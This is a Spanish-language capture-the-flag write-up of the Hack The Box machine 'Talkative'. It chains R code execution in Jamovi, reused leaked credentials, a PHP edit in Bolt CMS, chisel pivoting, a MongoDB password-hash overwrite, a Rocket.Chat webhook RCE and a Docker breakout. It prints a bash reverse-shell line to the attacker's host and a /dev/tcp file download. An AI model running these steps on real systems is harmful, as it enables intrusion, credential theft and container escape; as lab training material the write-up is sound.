---
layout: post
title: Talkative
date: 2023-02-21
description:
img:
fig-caption:
tags: [eWPT, OSWE, eCPPTv2, OSCP (Escalada)]
---
___

<center><img src="/writeups/assets/img/Talkative-htb/Talkative.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Enumeración de Jamovi

* Ejecución de Código en lenguaje R

* Reutilización de credenciales

* Modificación de archivos PHP

* Pivoting

* Enumeración de tareas CRON

* Remote Port Forwarding

* Enumeración y edición de MongoDB

* Abuso de Rocket.Chat

* Enumeración con CDK

* Docker Breakout (Escalada de Privilegios)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.11.155 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-21 15:50 GMT
Nmap scan report for 10.10.11.155
Host is up (0.067s latency).
Not shown: 65529 closed tcp ports (reset), 1 filtered tcp port (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
80/tcp   open  http
3000/tcp open  ppp
8080/tcp open  http-proxy
8081/tcp open  blackice-icecap
8082/tcp open  blackice-alerts

Nmap done: 1 IP address (1 host up) scanned in 12.99 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p80,3000,8080,8081,8082 10.10.11.155 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-21 15:50 GMT
Nmap scan report for talkative.htb (10.10.11.155)
Host is up (0.086s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Talkative.htb | Talkative
|_http-server-header: Apache/2.4.52 (Debian)
|_http-generator: Bolt
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: rnKHWgktKGFqAoDAo
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Tue, 21 Feb 2023 15:51:07 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta name="apple-mobile-web-app-capable" conten
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: rnKHWgktKGFqAoDAo
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Tue, 21 Feb 2023 15:51:08 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta name="apple-mobile-web-app-capable" conten
|   Help, NCP: 
|_    HTTP/1.1 400 Bad Request
8080/tcp open  http    Tornado httpd 5.0
|_http-title: jamovi
|_http-server-header: TornadoServer/5.0
8081/tcp open  http    Tornado httpd 5.0
|_http-title: 404: Not Found
|_http-server-header: TornadoServer/5.0
8082/tcp open  http    Tornado httpd 5.0
|_http-title: 404: Not Found
|_http-server-header: TornadoServer/5.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.93%I=7%D=2/21%Time=63F4E86A%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,2E9E,"HTTP/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r\nX-In
SF:stance-ID:\x20rnKHWgktKGFqAoDAo\r\nContent-Type:\x20text/html;\x20chars
SF:et=utf-8\r\nVary:\x20Accept-Encoding\r\nDate:\x20Tue,\x2021\x20Feb\x202
SF:023\x2015:51:07\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html
SF:>\n<html>\n<head>\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/c
SF:ss\"\x20class=\"__meteor-css__\"\x20href=\"/3ab95015403368c507c78b4228d
SF:38a494ef33a08\.css\?meteor_css_resource=true\">\n<meta\x20charset=\"utf
SF:-8\"\x20/>\n\t<meta\x20http-equiv=\"content-type\"\x20content=\"text/ht
SF:ml;\x20charset=utf-8\"\x20/>\n\t<meta\x20http-equiv=\"expires\"\x20cont
SF:ent=\"-1\"\x20/>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=
SF:\"IE=edge\"\x20/>\n\t<meta\x20name=\"fragment\"\x20content=\"!\"\x20/>\
SF:n\t<meta\x20name=\"distribution\"\x20content=\"global\"\x20/>\n\t<meta\
SF:x20name=\"rating\"\x20content=\"general\"\x20/>\n\t<meta\x20name=\"view
SF:port\"\x20content=\"width=device-width,\x20initial-scale=1,\x20maximum-
SF:scale=1,\x20user-scalable=no\"\x20/>\n\t<meta\x20name=\"mobile-web-app-
SF:capable\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-
SF:app-capable\"\x20conten")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\n\r\n")%r(NCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(HTT
SF:POptions,2E9E,"HTTP/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r\nX-In
SF:stance-ID:\x20rnKHWgktKGFqAoDAo\r\nContent-Type:\x20text/html;\x20chars
SF:et=utf-8\r\nVary:\x20Accept-Encoding\r\nDate:\x20Tue,\x2021\x20Feb\x202
SF:023\x2015:51:08\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html
SF:>\n<html>\n<head>\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/c
SF:ss\"\x20class=\"__meteor-css__\"\x20href=\"/3ab95015403368c507c78b4228d
SF:38a494ef33a08\.css\?meteor_css_resource=true\">\n<meta\x20charset=\"utf
SF:-8\"\x20/>\n\t<meta\x20http-equiv=\"content-type\"\x20content=\"text/ht
SF:ml;\x20charset=utf-8\"\x20/>\n\t<meta\x20http-equiv=\"expires\"\x20cont
SF:ent=\"-1\"\x20/>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=
SF:\"IE=edge\"\x20/>\n\t<meta\x20name=\"fragment\"\x20content=\"!\"\x20/>\
SF:n\t<meta\x20name=\"distribution\"\x20content=\"global\"\x20/>\n\t<meta\
SF:x20name=\"rating\"\x20content=\"general\"\x20/>\n\t<meta\x20name=\"view
SF:port\"\x20content=\"width=device-width,\x20initial-scale=1,\x20maximum-
SF:scale=1,\x20user-scalable=no\"\x20/>\n\t<meta\x20name=\"mobile-web-app-
SF:capable\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-
SF:app-capable\"\x20conten");
Service Info: Host: 172.17.0.10

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.91 seconds
```

Agrego el dominio ```talkative.htb``` al ```/etc/hosts```

## Puerto 80,3000,8080,8081,8082 (HTTP)

Con whatweb analizo las tecnologías que emplea el servidor web

```null
for port in 80 3000 8080 8081 8082; do echo -e "\n[+] Puerto $port"; whatweb http://10.10.11.155:$port; done

[+] Puerto 80
http://10.10.11.155:80 [301 Moved Permanently] Apache[2.4.52], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.52 (Debian)], IP[10.10.11.155], RedirectLocation[http://talkative.htb], Title[301 Moved Permanently]
http://talkative.htb [200 OK] Apache[2.4.52], Country[RESERVED][ZZ], Email[support@talkative.htb], Frame, HTML5, HTTPServer[Debian Linux][Apache/2.4.52 (Debian)], IP[10.10.11.155], MetaGenerator[Bolt], PHP[7.4.28,], Script, Title[Talkative.htb | Talkative], UncommonHeaders[permissions-policy,link], X-Powered-By[PHP/7.4.28, Bolt], X-UA-Compatible[ie=edge]

[+] Puerto 3000
http://10.10.11.155:3000 [200 OK] Country[RESERVED][ZZ], HTML5, IP[10.10.11.155], Script[text/javascript], Title[Talkative&#39;s Rocket Chat], UncommonHeaders[x-instance-id], X-UA-Compatible[IE=edge], X-XSS-Protection[1]

[+] Puerto 8080
http://10.10.11.155:8080 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[TornadoServer/5.0], IP[10.10.11.155], Script[text/javascript], Title[jamovi]

[+] Puerto 8081
http://10.10.11.155:8081 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[TornadoServer/5.0], IP[10.10.11.155], Title[404: Not Found]

[+] Puerto 8082
http://10.10.11.155:8082 [404 Not Found] Country[RESERVED][ZZ], HTTPServer[TornadoServer/5.0], IP[10.10.11.155], Title[404: Not Found]
```

Las páginas principales se ven así:

<img src="/writeups/assets/img/Talkative-htb/1.png" alt="">

Como sé que el CMS es ```Bolt```, puedo tratar de ver el panel de inicio de sesión, que se encuentra en ```/bolt```

<img src="/writeups/assets/img/Talkative-htb/2.png" alt="">

Pruebo las credenciales por defecto, pero no son válidas. Desde el ```Jamovi``` que se encuentra en el puerto 8080 es posible ejecutar comandos

<img src="/writeups/assets/img/Talkative-htb/3.png" alt="">

Me envío una reverse shell

```null
system("bash -c 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1' 2>&1", intern = TRUE)
```

Y la recibo en una sesión de netcat

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.155] 48816
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@b06821bbda78:/# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@b06821bbda78:/# ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
root@b06821bbda78:/# export TERM=xterm
root@b06821bbda78:/# export SHELL=bash
root@b06821bbda78:/# stty rows 55 columns 209
```

Estoy dentro de un contenedor

```null
root@b06821bbda78:/# hostname -I
172.18.0.2 
```

Dentro del directorio personal de ```root``` hay un comprimido

```null
root@b06821bbda78:~# file bolt-administration.omv  
bolt-administration.omv: Zip archive data, at least v2.0 to extract
```

Lo transfiero a mi equipo para ver su contenido

```null
unzip bolt-administration.omv -d bolt-administration
```

En el archivo ```xdata.json``` están almacenados usuarios con sus respectivas contraseñas

```null
cat xdata.json | jq | grep ","
        0,
        "Username",
        "Username",
      ],
        1,
        "matt@talkative.htb",
        "matt@talkative.htb",
      ],
        2,
        "janit@talkative.htb",
        "janit@talkative.htb",
      ],
        3,
        "saul@talkative.htb",
        "saul@talkative.htb",
  },
        0,
        "Password",
        "Password",
      ],
        1,
        "jeO09ufhWD<s",
        "jeO09ufhWD<s",
      ],
        2,
        "bZ89h}V<S_DA",
        "bZ89h}V<S_DA",
      ],
        3,
        ")SQWGm>9KHEA",
        ")SQWGm>9KHEA",
  },
```

Pruebo estas contraseñas para intentar autenticarme en el panel administrativo del BoltCMS. Es válido para ```admin:jeO09ufhWD<s```

<img src="/writeups/assets/img/Talkative-htb/4.png" alt="">

Retoco un archivo en PHP para inyectar código

<img src="/writeups/assets/img/Talkative-htb/5.png" alt="">

Tramito una petición a ese archivo y gano acceso a otro contenedor

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.155] 44658
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@0a98dac47868:/var/www/talkative.htb/bolt/public$ script /dev/null -c bash
<talkative.htb/bolt/public$ script /dev/null -c bash      
Script started, output log file is '/dev/null'.
www-data@0a98dac47868:/var/www/talkative.htb/bolt/public$ ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
```

```null
www-data@0a98dac47868:/var/www/talkative.htb/bolt/public$ hostname -I
172.17.0.10 
```

Aplico una búsqueda recursiva de archivos que contengan las palabras ```username``` o ```password```

```null
www-data@0a98dac47868:/var/www/talkative.htb/bolt/public$ grep -rilE "user|password"    
robots.txt
assets/197.css
assets/bolt.css
assets/article/article-editor.min.js
assets/197.js
assets/redactor/langs/no.js
assets/redactor/redactor.min.js
assets/bolt.js
assets/322.js
bundles/apiplatform/swagger-ui/swagger-ui.css.map
bundles/apiplatform/swagger-ui/swagger-ui-standalone-preset.js
bundles/apiplatform/swagger-ui/swagger-ui-standalone-preset.js.map
bundles/apiplatform/swagger-ui/swagger-ui.css
bundles/apiplatform/swagger-ui/swagger-ui-bundle.js.map
bundles/apiplatform/swagger-ui/swagger-ui-bundle.js
bundles/apiplatform/redoc/redoc.standalone.js
bundles/apiplatform/fetch/fetch.js
bundles/apiplatform/graphql-playground/middleware.js
bundles/apiplatform/graphiql/graphiql.css
bundles/apiplatform/graphiql/graphiql.min.js
bundles/apiplatform/react/react.production.min.js
bundles/apiplatform/react/react-dom.production.min.js
bundles/translation/css/bootstrap.4.1.1.min.css.map
bundles/translation/css/content-tools.min.css
bundles/translation/css/bootstrap.4.1.1.min.css
bundles/translation/js/symfonyProfiler.js
bundles/translation/js/content-tools.min.js
theme/base-2018/css/bulma.css
theme/base-2018/partials/_fresh_install.twig
theme/base-2018/partials/_aside.twig
theme/base-2018/js/app.js
theme/base-2021/css/tailwind.css
theme/skeleton/partials/_recordfooter.twig
theme/skeleton/partials/_fresh_install.twig
theme/skeleton/partials/_aside.twig
```

Pero ninguno de estos contiene credenciales. Sin embargo, tengo 3 usuarios con contraseñas que extraje del primer contenedor. Pruebo a conectarme por SSH a la 172.17.0.1. Son válidas para ```saul:jeO09ufhWD<s```

```null
www-data@0a98dac47868:/var/www/talkative.htb/bolt/public$ ssh saul@172.17.0.1
The authenticity of host '172.17.0.1 (172.17.0.1)' can't be established.
ECDSA key fingerprint is SHA256:kUPIZ6IPcxq7Mei4nUzQI3JakxPUtkTlEejtabx4wnY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Could not create directory '/var/www/.ssh' (Permission denied).
Failed to add the host to the list of known hosts (/var/www/.ssh/known_hosts).
saul@172.17.0.1's password: 
Permission denied, please try again.
saul@172.17.0.1's password: 

saul@talkative:~$
`` 

Puedo ver la primera flag

```null
saul@talkative:~$ hostname -I
10.10.11.155 172.17.0.1 172.18.0.1 dead:beef::250:56ff:feb9:bfd9 
saul@talkative:~$ cat user.txt
1d9f0b5598c3316662b922d38f359339
```

# Escalada

Subo el ```pspy``` a la máquina víctima para encontrar procesos que se ejecutan en intervalos de tiempo

```null
2023/02/21 15:39:24 CMD: UID=0    PID=1      | /sbin/init auto automatic-ubiquity noprompt 
2023/02/21 15:40:01 CMD: UID=0    PID=5511   | cp /root/.backup/shadow /etc/shadow 
2023/02/21 15:40:01 CMD: UID=0    PID=5510   | /bin/sh -c cp /root/.backup/shadow /etc/shadow 
2023/02/21 15:40:01 CMD: UID=0    PID=5509   | /usr/sbin/CRON -f 
2023/02/21 15:40:01 CMD: UID=0    PID=5508   | /usr/sbin/CRON -f 
2023/02/21 15:40:01 CMD: UID=0    PID=5512   | /usr/sbin/CRON -f 
2023/02/21 15:40:01 CMD: UID=0    PID=5513   | cp /root/.backup/passwd /etc/passwd 
```

Está copiando un backup del ```/etc/passwd``` y ```/etc/shadow``` a las rutas originales. Esto no me sirve de nada. Más adelante encuentra otra tarea CRON

```null
2023/02/21 15:42:02 CMD: UID=0    PID=5535   | python3 /root/.backup/update_mongo.py 
2023/02/21 15:42:02 CMD: UID=0    PID=5534   | /bin/sh -c python3 /root/.backup/update_mongo.py 
```

Se está actualizando la base de datos ```mongodb```

Subo el ```chisel``` a la máquina víctima para crear un túnel por SOCKS5

En mi equipo lo ejecuto como servidor

```null
chisel server -p 1234 --reverse
```

Para conectarme como cliente

```null
saul@talkative:/tmp$ ./chisel client 10.10.16.6:1234 R:socks &>/dev/null & disown
```

Con un binario estático de ```nmap``` puedo encontrar desde la máquina víctima la IP que tiene el puerto del ```mongodb``` abierto

```null
Nmap scan report for 172.17.0.2
Host is up (0.00033s latency).
Not shown: 65534 closed ports
PORT      STATE SERVICE
27017/tcp open  unknown
```

Me conecto desde mi equipo pasando por ```proxychains```

```null
proxychains mongo 172.17.0.2
```

Una base de datos corresponde a la del administrador

```null
rs0:PRIMARY> show dbs
admin   0.000GB
config  0.000GB
local   0.011GB
meteor  0.005GB
```

```null
rs0:PRIMARY> use admin
switched to db admin
```

Pero no hay nada que me sirva

```null
rs0:PRIMARY> db.system.keys.find()
{ "_id" : NumberLong("6994889321446637571"), "purpose" : "HMAC", "key" : BinData(0,"be8+vxMbbQGXhSIC9JCM8PJ5AW4="), "expiresAt" : Timestamp(1636400583, 0) }
{ "_id" : NumberLong("6994889321446637572"), "purpose" : "HMAC", "key" : BinData(0,"UgV2A8wC1s8DKqLR3Fkq0/iImwY="), "expiresAt" : Timestamp(1644176583, 0) }
{ "_id" : NumberLong("7064639126477209602"), "purpose" : "HMAC", "key" : BinData(0,"jYn6UX96rygTtoGqDmO8rioyOMw="), "expiresAt" : Timestamp(1652640475, 0) }
{ "_id" : NumberLong("7064639126477209603"), "purpose" : "HMAC", "key" : BinData(0,"7eIYSysppesFzKU625JGtz3DyQ8="), "expiresAt" : Timestamp(1660416475, 0) }
{ "_id" : NumberLong("7202614461234937858"), "purpose" : "HMAC", "key" : BinData(0,"DCeAPfmRGfczhb0Biog7O9c84EI="), "expiresAt" : Timestamp(1684765361, 0) }
{ "_id" : NumberLong("7202614461234937859"), "purpose" : "HMAC", "key" : BinData(0,"BX7JTnSpVfXBIaCvb+Smwv42P80="), "expiresAt" : Timestamp(1692541361, 0) }
rs0:PRIMARY> db.system.version.find()
{ "_id" : "featureCompatibilityVersion", "version" : "4.0" }
```

Me cambio a ```meteor```. Dentro hay una tabla con usuarios

```null
rs0:PRIMARY> use meteor
```

```null
rs0:PRIMARY> db.users.find()
{ "_id" : "rocket.cat", "createdAt" : ISODate("2021-08-10T19:44:00.224Z"), "avatarOrigin" : "local", "name" : "Rocket.Cat", "username" : "rocket.cat", "status" : "online", "statusDefault" : "online", "utcOffset" : 0, "active" : true, "type" : "bot", "_updatedAt" : ISODate("2021-08-10T19:44:00.615Z"), "roles" : [ "bot" ] }
{ "_id" : "ZLMid6a4h5YEosPQi", "createdAt" : ISODate("2021-08-10T19:49:48.673Z"), "services" : { "password" : { "bcrypt" : "$2b$10$jzSWpBq.eJ/yn/Pdq6ilB.UO/kXHB1O2A.b2yooGebUbh69NIUu5y" }, "email" : { "verificationTokens" : [ { "token" : "dgATW2cAcF3adLfJA86ppQXrn1vt6omBarI8VrGMI6w", "address" : "saul@talkative.htb", "when" : ISODate("2021-08-10T19:49:48.738Z") } ] }, "resume" : { "loginTokens" : [ ] } }, "emails" : [ { "address" : "saul@talkative.htb", "verified" : false } ], "type" : "user", "status" : "offline", "active" : true, "_updatedAt" : ISODate("2023-02-21T14:33:17.630Z"), "roles" : [ "admin" ], "name" : "Saul Goodman", "lastLogin" : ISODate("2022-03-15T17:06:56.543Z"), "statusConnection" : "offline", "username" : "admin", "utcOffset" : 0 }
```

Corresponde al servicio que corre por el puerto 3000

<img src="/writeups/assets/img/Talkative-htb/6.png" alt="">

Puedo cambiarle la contraseña para conectarme como este usuario a la web. El hash corresponde a ```12345```

```null
rs0:PRIMARY> db.getCollection('users').update({username:"admin"}, { $set: {"services" : { "password" : {"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
WriteResult({ "nMatched" : 1, "nUpserted" : 0, "nModified" : 1 })
```

<img src="/writeups/assets/img/Talkative-htb/7.png" alt="">

Esta versión es vulnerable a una NoSQLi que deriva a un RCE

<img src="/writeups/assets/img/Talkative-htb/8.png" alt="">

Encuentro una prueba de concepto en [Github](https://github.com/CsEnox/CVE-2021-22911). Creo un nuevo webhook que me envíe una reverse shell

<img src="/writeups/assets/img/Talkative-htb/9.png" alt="">

Activo el webhook y gano acceso a otro contenedor

```null
curl http://10.10.11.155:3000/hooks/swN6otCh7WDQhasHN/S5oSyBz7BFiDj2KttQZK2CmofskC6bbTZHh5QDLdqfQM2bYW
```

```null
nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.155] 34062
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@c150397ccd63:/app/bundle/programs/server# script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
root@c150397ccd63:/app/bundle/programs/server# ^Z
zsh: suspended  nc -nlvp 443
❯ stty raw -echo; fg
[1]  + continued  nc -nlvp 443
                              reset xterm
root@c150397ccd63:/app/bundle/programs/server# export TERM=xterm
root@c150397ccd63:/app/bundle/programs/server# export SHELL=bash
root@c150397ccd63:/app/bundle/programs/server# stty rows 55 columns 209
```

```null
root@c150397ccd63:/app/bundle/programs/server# hostname -I
172.17.0.3 
```

Busco en [Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation) formas de efectuar un Docker Breakout. Utilizo [CDK](https://github.com/cdk-team/CDK/releases/tag/v1.5.1) para enumerar el contenedor

```null
nc -nlvp 443 < cdk
listening on [any] 443 ...
connect to [10.10.16.6] from (UNKNOWN) [10.10.11.155] 34214
```

```null
root@c150397ccd63:~# cat < /dev/tcp/10.10.16.6/443 > cdk
```

Otra forma es utilizando ```pwncat-cs```

```null
pwncat-cs -lp 443

(local) pwncat$ upload cdk /tmp/cdk
/tmp/cdk ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 12.0/12.0 MB • 866.9 kB/s • 0:00:00
[17:03:44] uploaded 12.01MiB in 24.07 seconds                                                                                                                                                       upload.py:76

(local) pwncat$ back
(remote) root@c150397ccd63:/app/bundle/programs/server# 
```

Lo ejecuto y encuentra lo siguiente:

```null
root@c150397ccd63:~# ./cdk evaluate
...
 Added capability list: CAP_DAC_READ_SEARCH
[*] Maybe you can exploit the Capabilities below:
[!] CAP_DAC_READ_SEARCH enabled. You can read files from host. Use 'cdk run cap-dac-read-search' ... for exploitation.
...
```

Puedo visualizar la segunda flag

```null
root@c150397ccd63:~# ./cdk run cap-dac-read-search /root/root.txt
Running with target: /root/root.txt, ref: /etc/hostname
33f94f70a5d8d427f1fcd10b555422e2
```

Es posible ganar acceso a la máquina abusando también de esta capability. En [Hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_dac_override) comparten un script en c que automatiza el sobrescribir archivos de la máquina host